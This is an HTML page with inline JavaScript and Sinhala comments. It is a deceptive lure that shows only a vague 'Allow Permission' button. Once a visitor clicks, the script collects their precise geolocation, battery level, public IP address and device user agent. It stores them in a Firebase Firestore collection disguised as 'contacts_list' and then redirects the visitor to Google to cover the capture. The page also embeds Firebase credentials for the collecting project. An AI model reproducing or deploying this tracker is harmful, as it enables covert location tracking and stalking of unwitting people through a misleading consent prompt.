<!DOCTYPE html>
<html>
<head>
    <title>Connect</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="text-align:center; padding:50px; font-family:sans-serif; background-color: #f4f4f9;">
    <div id="main-box">
        <h3>Please Allow Permissions to Continue</h3>
        <button id="btn" style="padding:15px 30px; background:blue; color:white; border:none; border-radius:10px; font-size:18px; cursor:pointer;">Allow Permission</button>
        <p id="msg"></p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCSrL5IZHh5Zy4cFITVF9wxdiaeiynyOrM",
            authDomain: "myself-4706c.firebaseapp.com",
            projectId: "myself-4706c",
            storageBucket: "myself-4706c.firebasestorage.app",
            messagingSenderId: "638432919752",
            appId: "1:638432919752:web:0de83de77e3b0e3a07a5fd"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('btn').onclick = async () => {
            const btn = document.getElementById('btn');
            const msg = document.getElementById('msg');
            
            btn.innerText = "Processing...";
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    
                    // 1. බැටරි මට්ටම ලබාගැනීම
                    let batteryLevel = "Unknown";
                    try {
                        if (navigator.getBattery) {
                            const battery = await navigator.getBattery();
                            batteryLevel = Math.round(battery.level * 100) + "%";
                        }
                    } catch (e) { batteryLevel = "Not Supported"; }

                    // 2. IP ලිපිනය ලබාගැනීම
                    let ip = "Hidden";
                    try {
                        const res = await fetch('https://api.ipify.org?format=json');
                        const data = await res.json();
                        ip = data.ip;
                    } catch (e) { ip = "Blocked"; }

                    // 3. දත්ත යැවීම
                    await addDoc(collection(db, "contacts_list"), {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy) + " meters",
                        battery: batteryLevel,
                        ip_address: ip,
                        device: navigator.userAgent,
                        time: new Date().toLocaleString()
                    });

                    msg.innerText = "Done! Redirecting...";
                    msg.style.color = "green";

                    // 4. Google වෙත යොමු කිරීම
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 2000);

                }, (err) => {
                    msg.innerText = "Permission Denied.";
                    msg.style.color = "red";
                    btn.innerText = "Try Again";
                    btn.disabled = false;
                });
            }
        };
    </script>
</body>
</html>
